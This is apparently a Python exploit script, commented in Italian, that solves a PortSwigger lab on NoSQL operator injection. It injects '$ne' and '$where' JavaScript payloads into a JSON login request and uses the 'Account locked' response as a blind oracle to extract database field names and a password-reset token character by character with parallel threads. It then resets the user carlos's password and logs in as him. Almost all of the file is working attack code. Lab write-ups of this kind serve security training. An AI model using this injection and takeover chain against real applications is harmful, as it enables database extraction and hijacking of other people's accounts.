import requests
import sys
import string
import urllib3
import time
import threading
import random
from concurrent.futures import ThreadPoolExecutor
from base_exploit import BaseNoSQLExploit, print_error, print_success, print_info, GREEN, RED, CYAN, YELLOW, WHITE, RESET, BOLD, MY_ACCOUNT_ENDPOINT

# Disabilita i warning SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== CONFIGURAZIONE ====================
LAB_ID = "YOUR_LAB_CODE_HERE"

# ==================== COSTANTI ====================
REFRESH_RATE = 0.05  # Velocità aggiornamento visualizer
CHARSET = string.ascii_letters + string.digits + "-_!{}"
NEW_PASSWORD = "pwned123"  # Password per il takeover
MAX_FIELD_SCAN = 10        # Massimo numero di campi da scansionare
MAX_KEY_LENGTH = 25        # Lunghezza massima nome campo
MAX_VALUE_LENGTH = 100     # Lunghezza massima valore campo

# ==================== EXPLOIT CLASS ==================== 
#NoSQLMatrixExploit

class OperatorInjToExtractUnknownFields(BaseNoSQLExploit):
    """Exploit per lab PortSwigger: NoSQL Injection con estrazione dati avanzata."""
    
    def __init__(self, lab_id):
        super().__init__(lab_id)
        self.forgot_url = f"{self.base_url}/forgot-password"
        
        # Stato per parallel attack
        self.charset = CHARSET
        self.decrypted_chars = []
        self.stop_event = threading.Event()
        self.current_target_desc = ""

    def trigger_reset(self):
        try:
            csrf = self.get_csrf_token(self.forgot_url)
            data = {"csrf": csrf, "username": "carlos"}
            r = self.session.post(self.forgot_url, data=data)
            return r.status_code == 200
        except: return False

    def send_injection(self, where_payload):
        """
        Invia una NoSQL injection tramite il parametro $where.
        
        Args:
            where_payload: Condizione JavaScript da iniettare
            
        Returns:
            bool: True se l'account viene bloccato (condizione vera), False altrimenti
        """
        headers = {"Content-Type": "application/json"}
        data = {
            "username": "carlos",
            "password": {"$ne": "invalid"},
            "$where": where_payload
        }
        try:
            r = self.session.post(self.login_url, json=data, headers=headers)
            return "Account locked" in r.text
        except:
            return False

    def get_key_length(self, key_index):
        """Determina la lunghezza del nome di un campo del database.
        
        Args:
            key_index: Indice del campo nella struttura Object.keys(this)
            
        Returns:
            int: Lunghezza del nome del campo, None se non trovato
        """
        for length in range(1, MAX_KEY_LENGTH):
            payload = f"Object.keys(this)[{key_index}].length == {length}"
            if self.send_injection(payload):
                return length
        return None

    def worker_crack_key_char(self, position, key_index):
        """Worker thread per craccare un singolo carattere del nome campo.
        
        Args:
            position: Posizione del carattere da trovare
            key_index: Indice del campo nel database
        """
        shuffled = list(self.charset)
        random.shuffle(shuffled)
        
        for char in shuffled:
            if self.stop_event.is_set():
                break
            if self.decrypted_chars[position] is not None:
                return
            
            payload = f"Object.keys(this)[{key_index}].match('^.{{{position}}}{char}.*')"
            if self.send_injection(payload):
                self.decrypted_chars[position] = char
                return

    def get_value_length(self, field_name):
        """Determina la lunghezza del valore di un campo.
        
        Args:
            field_name: Nome del campo di cui trovare la lunghezza del valore
            
        Returns:
            int: Lunghezza del valore, None se non trovato
        """
        print_info(f"Calcolo lunghezza valore per '{field_name}'...")
        for length in range(1, MAX_VALUE_LENGTH):
            payload = f"this.{field_name}.length == {length}"
            if self.send_injection(payload):
                return length
        return None

    def worker_crack_value_char(self, position, field_name):
        """Worker thread per craccare un singolo carattere del valore del campo.
        
        Args:
            position: Posizione del carattere da trovare
            field_name: Nome del campo di cui estrarre il valore
        """
        shuffled = list(self.charset)
        random.shuffle(shuffled)
        
        for char in shuffled:
            if self.stop_event.is_set():
                break
            if self.decrypted_chars[position] is not None:
                return
            
            payload = f"this.{field_name}.match('^.{{{position}}}{char}.*')"
            if self.send_injection(payload):
                self.decrypted_chars[position] = char
                return

    def visualizer_loop(self, total_len):
        """Loop di visualizzazione in stile Matrix per il progresso del cracking.
        
        Args:
            total_len: Lunghezza totale della stringa da craccare
        """
        sys.stdout.write("\n")
        
        while not self.stop_event.is_set():
            display = ""
            found_count = 0
            
            # Costruisci la stringa di visualizzazione
            for i in range(total_len):
                c = self.decrypted_chars[i]
                if c:
                    display += f"{GREEN}{BOLD}{c}{RESET}"
                    found_count += 1
                else:
                    # Carattere random per effetto Matrix
                    display += f"{WHITE}{random.choice(string.ascii_letters)}{RESET}"
            
            # Calcola percentuale completamento
            percent = int((found_count / total_len) * 100)
            sys.stdout.write(f"\r {YELLOW}>> {self.current_target_desc}:{RESET} [{display}] {percent}%")
            sys.stdout.flush()
            
            # Termina se completato
            if found_count == total_len:
                break
            
            time.sleep(REFRESH_RATE)
        
        sys.stdout.write("\n")

    def run_parallel_attack(self, target_len, worker_func, *args):
        """Esegue un attacco parallelo per craccare una stringa carattere per carattere.
        
        Args:
            target_len: Lunghezza della stringa target
            worker_func: Funzione worker da eseguire per ogni posizione
            *args: Argomenti aggiuntivi da passare al worker
            
        Returns:
            str: Stringa completa craccata
        """
        self.decrypted_chars = [None] * target_len
        self.stop_event.clear()
        
        with ThreadPoolExecutor(max_workers=target_len + 2) as executor:
            # Avvia worker per ogni posizione
            for i in range(target_len):
                executor.submit(worker_func, i, *args)
            
            # Visualizza progresso
            self.visualizer_loop(target_len)
            self.stop_event.set()
        
        return "".join(self.decrypted_chars)

    def _select_target_field(self, found_fields):
        """Permette all'utente di selezionare il campo target contenente il token.
        
        Args:
            found_fields: Dizionario {indice: nome_campo}
            
        Returns:
            str: Nome del campo selezionato, None se errore
        """
        print("\n" + "="*40)
        print(f"{YELLOW}SELEZIONE MANUALE DEL CAMPO TARGET{RESET}")
        print("I campi trovati nel database sono:")
        for idx, name in found_fields.items():
            print(f"   [{idx}] {GREEN}{name}{RESET}")
        
        print("="*40)
        try:
            choice = int(input(f"{BOLD}Inserisci il numero del campo contenente il token: {RESET}"))
            if choice not in found_fields:
                print_error("Indice non valido.")
                return None
            target_field_name = found_fields[choice]
            print_info(f"Target selezionato: {target_field_name}")
            return target_field_name
        except ValueError:
            print_error("Devi inserire un numero.")
            return None
    
    def run(self):
        """Esegue l'exploit completo: enumera campi, estrae token, esegue takeover."""
        # Verifica connettività
        if not self.check_lab_status():
            print_error("Lab non raggiungibile.")
            return

        # FASE 0: Inizializzazione database
        print_info("1. Innesco procedura reset per creare la struttura DB...")
        if not self.trigger_reset():
            print_error("Impossibile contattare server.")
            return

        # FASE 1: Enumerazione campi database
        print_info("2. SCANSIONE CAMPI DATABASE (Matrix Mode)...")
        found_fields = {}
        
        for i in range(MAX_FIELD_SCAN):
            sys.stdout.write(f"\r{CYAN}[*] Analisi campo indice {i}...{RESET}")
            sys.stdout.flush()
            
            name_len = self.get_key_length(i)
            if not name_len:
                break  # Non ci sono più campi
                
            self.current_target_desc = f"FIELD NAME [{i}]"
            field_name = self.run_parallel_attack(name_len, self.worker_crack_key_char, i)
            found_fields[i] = field_name
            print_success(f"Trovato campo [{i}]: {field_name}")

        if not found_fields:
            print_error("Nessun campo trovato.")
            return

        # FASE 2: Selezione campo target da parte dell'utente
        target_field_name = self._select_target_field(found_fields)
        if not target_field_name:
            return

        # FASE 3: Refresh token per evitare scadenza
        print("\n")
        print_info("Rigenerazione token per evitare scadenza...")
        if not self.trigger_reset():
            print_error("Errore refresh token.")
            return

        # FASE 4: Estrazione valore del token
        token_len = self.get_value_length(target_field_name)
        if token_len:
            self.current_target_desc = f"VALUE of {target_field_name}"
            final_token = self.run_parallel_attack(token_len, self.worker_crack_value_char, target_field_name)
            
            print("\n" + f"{GREEN}={'='*42}{RESET}")
            print(f"{GREEN}{BOLD} TOKEN ESTRATTO: {final_token} {RESET}")
            print(f"{GREEN}={'='*42}{RESET}\n")
            
            self.perform_takeover(target_field_name, final_token)
        else:
            print_error(f"Il campo {target_field_name} sembra vuoto o non leggibile.")

    def _print_success_banner(self):
        """Stampa il banner ASCII di successo."""
        print("\n")
        # LAB
        print(f"{GREEN}██╗══════██╗═█████╗═██████╗═{RESET}")
        print(f"{GREEN}██║══════██╔══██╗██╔══██╗{RESET}")
        print(f"{GREEN}██║══════███████║██████╔╝{RESET}")
        print(f"{GREEN}██║══════██╔══██║██╔══██╗{RESET}")
        print(f"{GREEN}███████╗██║══██║██████╔╝{RESET}")
        print(f"{GREEN}╚══════╝╚═╝══╚═╝╚═════╝═{RESET}")
        print("")
        # SOLVED
        print(f"{GREEN}███████╗═█████╗═██╗══════██╗═══██╗███████╗██████╗═{RESET}")
        print(f"{GREEN}██╔════╝██╔══██╗██║══════██║═══██║██╔════╝██╔══██╗{RESET}")
        print(f"{GREEN}███████╗██║══██║██║══════██║═══██║█████╗══██║══██║{RESET}")
        print(f"{GREEN}╚════██║██║══██║██║══════╚██╗═██╔╝██╔══╝══██║══██║{RESET}")
        print(f"{GREEN}███████║╚█████╔╝███████╗═╚████╔╝═███████╗██████╔╝{RESET}")
        print(f"{GREEN}╚══════╝═╚════╝═╚══════╝══╚═══╝══╚══════╝╚═════╝═{RESET}")
        print("\n" + f"{GREEN}{BOLD} LAB SOLVED! Accesso confermato come Carlos.{RESET}")
        print(f" Credenziali usate: carlos : {NEW_PASSWORD}")
    
    def perform_takeover(self, token_name, token_value):
        NEW_PASS = "pwned123"
        print_info(f"Tentativo reset password con token: {token_value}")
        
        # 1. Reset Password
        reset_link = f"{self.forgot_url}?{token_name}={token_value}"
        csrf = self.get_csrf_token(reset_link)
        if not csrf: 
            print_error("Impossibile caricare pagina reset (Token scaduto?).")
            return

        data = {
            "csrf": csrf, "username": "carlos", 
            "new-password-1": NEW_PASS, "new-password-2": NEW_PASS,
            token_name: token_value
        }
        
        # --- DEBUG POST RESET ---
        print("\n" + "="*40)
        print(f"[DEBUG] Invio POST Reset a: {self.forgot_url}")
        print(f"[DEBUG] Dati inviati:\n{data}")
        print("="*40 + "\n")
        
        r_reset = self.session.post(self.forgot_url, data=data)
        
        # --- DEBUG RESPONSE RESET ---
        print("\n" + "="*40)
        print(f"[DEBUG] Status Code Reset: {r_reset.status_code}")
        # Stampiamo i primi 500 caratteri per vedere se c'è un errore evidente
        print(f"[DEBUG] Response Body (anteprima):\n{r_reset.text[:500]}") 
        print("="*40 + "\n")
        
        if r_reset.status_code == 200:
            print_success("Password resettata con successo. Procedo al login...")
            
            # --- 2. LOGIN (Modalità JSON) ---
            # CORREZIONE: L'endpoint login in questo lab si aspetta JSON.
            # Quando si usa JSON, spesso il token CSRF non è richiesto o è gestito diversamente.
            # L'errore "Missing parameter csrf" appariva perché inviavi 'data=' (form) invece di 'json='.
            
            login_data = {
                "username": "carlos", 
                "password": NEW_PASS
            }
            
            print_info(f"Invio Login JSON a: {self.login_url}")
            
            # Usiamo json=login_data invece di data=login_data
            r_login = self.session.post(self.login_url, json=login_data)
            
            print(f"[DEBUG] Status Code Login: {r_login.status_code}")
            
            # --- 3. VERIFICA ---
            # Navighiamo esplicitamente a my-account per verificare la sessione
            account_url = f"{self.base_url}{MY_ACCOUNT_ENDPOINT}?id=carlos"
            r_account = self.session.get(account_url)

            # 4. CONTROLLO XPATH SULLA RISPOSTA DELLA PAGINA ACCOUNT
            if self.check_if_solved(r_account):
                self._print_success_banner()
            else:
                # Fallback check
                if "Your username is: carlos" in r_account.text or "My account" in r_account.text:
                    print_success("Accesso riuscito come Carlos (Banner non rilevato, ma sei loggato!).")
                    print(f" Credenziali usate: carlos : {NEW_PASSWORD}")
                else:
                    print_error("Login effettuato ma Banner 'Solved' NON trovato e sessione non confermata.")
        else:
            print_error(f"Cambio password fallito. Status: {r_reset.status_code}")

# ==================== ENTRY POINT ====================            
if __name__ == "__main__":
    # Validazione configurazione
    if not BaseNoSQLExploit.validate_lab_id(LAB_ID, "YOUR_LAB_CODE_HERE"):
        sys.exit(1)
    
    # Esecuzione exploit
    exploit = OperatorInjToExtractUnknownFields(LAB_ID)
    exploit.run()
